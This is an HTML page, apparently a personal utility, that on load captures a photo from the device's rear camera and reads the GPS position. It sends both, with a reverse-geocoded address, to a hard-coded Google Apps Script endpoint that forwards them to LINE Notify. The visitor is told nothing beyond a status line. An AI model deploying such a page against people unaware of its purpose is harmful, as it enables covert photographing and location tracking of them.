<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LINE Notify 自動拍照傳送</title>
</head>
<body>
  <p id="status">狀態：啟動中...</p>

  <script>
    let photoData = null;

    // 啟動相機並自動拍照與傳送
    async function startCameraAndSend() {
      const statusElement = document.getElementById('status');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } }, // 使用後置相機
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        // 等待相機畫面載入
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play(); // 播放相機畫面
            resolve();
          };
        });

        // 延遲 1 秒拍照
        setTimeout(() => {
          // 使用隱藏的 Canvas 拍攝照片
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640; // 設置默認寬度以防解析度不可用
          canvas.height = video.videoHeight || 480; // 設置默認高度
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 壓縮為 Base64 格式
          photoData = canvas.toDataURL('image/jpeg', 0.5); // 壓縮至 50% 品質
          stream.getTracks().forEach((track) => track.stop()); // 停止相機
          getGpsCoordinates();
        }, 1000); // 延遲 1 秒拍照
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 取得 GPS 經緯度資訊
    async function getGpsCoordinates() {
      const statusElement = document.getElementById('status');
      try {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          // 透過經緯度取得地址
          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await response.json();
          const address = data.display_name || '未知地址';

          // 發送照片到後端
          sendPhotoToServer(photoData, latitude, longitude, address);
        }, (error) => {
          console.error('GPS 錯誤:', error);
          statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限。';
        });
      } catch (error) {
        console.error('錯誤:', error);
        statusElement.innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 發送照片和 GPS 到後端
    async function sendPhotoToServer(photoData, latitude, longitude, address) {
      const statusElement = document.getElementById('status');
      try {
        // 去掉 Base64 前綴
        const base64Image = photoData.split(',')[1];

        // 構造表單資料
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', base64Image);
        formData.append('latitude', latitude);
        formData.append('longitude', longitude);
        formData.append('address', address);

        // 發送 POST 請求到 Google Apps Script
        const response = await fetch('https://script.google.com/macros/s/AKfycbwBp6rB4i7nOmt7RoSLG8wfFMIk5rWxHZsvZr-m0WHAc3_ITf_l5netKVgCN-wITxUOHw/exec', {
          method: 'POST',
          body: formData, // 使用表單格式傳輸
        });

        const result = await response.json();

        // 更新狀態
        if (result.success) {
          statusElement.innerText = '照片及位置信息已成功傳送到 LINE Notify！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 啟動相機並自動拍照與傳送
    startCameraAndSend();
  </script>
</body>
</html>
